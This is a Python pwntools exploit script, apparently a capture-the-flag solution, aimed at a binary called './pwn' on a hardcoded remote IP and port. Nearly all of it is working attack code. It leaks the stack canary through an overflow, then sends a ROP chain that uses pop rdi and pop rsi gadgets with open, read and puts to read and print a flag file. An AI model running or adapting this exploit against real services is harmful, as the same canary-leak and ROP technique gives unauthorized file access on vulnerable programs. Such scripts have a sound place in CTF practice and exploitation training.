#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./pwn"
libcPath = ""
remoteAddr = "106.75.64.61"
remotePort = 16356

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort, timeout = 300)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def fsb(payload):
    io.sendlineafter(":", "3")
    io.sendlineafter('''think?)\n''', payload)


def bored(payload, n = "n"):
    io.sendlineafter("...\n", payload)
    io.sendlineafter("n\n", n)

def stack(payload):
    io.sendlineafter(":", "1")
    io.sendafter("..\n", payload)

def secret(payload):
    io.sendlineafter(":", "9011")
    io.sendafter(":", payload)

if __name__ == "__main__":
    io.sendlineafter(":", "2")
    for i in xrange(4):
        bored('a')
    bored('a', 'y')

    #  DEBUG([0x400A6E])
    stack('0' * (0xa8 + 1))
    io.recvuntil("0" * (0xa8 + 1))
    canary = '\0' + io.recvn(7)
    print canary.encode('hex')
 
    '''
    0x0000000000400c53 : pop rdi ; ret
    0x0000000000400c51 : pop rsi ; pop r15 ; ret
    '''
    prdi = 0x400c53
    prsi_r15 = 0x400c51
    payload = flat(['./flag\0\0', canary, 'bbbbbbbb'])
    payload += flat([prdi, 0x602080, prsi_r15, 0, 0, elf.plt['open']])
    payload += flat([prdi, 0, prsi_r15, elf.bss() + 0x500, 0, elf.plt['read']])
    payload += flat([prdi, elf.bss() + 0x500, elf.plt['puts']])

    io.sendlineafter(":", "2")
    bored(payload, 'y')

    #  DEBUG([0x40093D])
    #  raw_input("DEBUG: ")
    try:
        for i in xrange(9999):
            #  context.log_level = "debug"
            #  success(i)
            secret('\0')
    except:
        print io.recv()
        io.close()
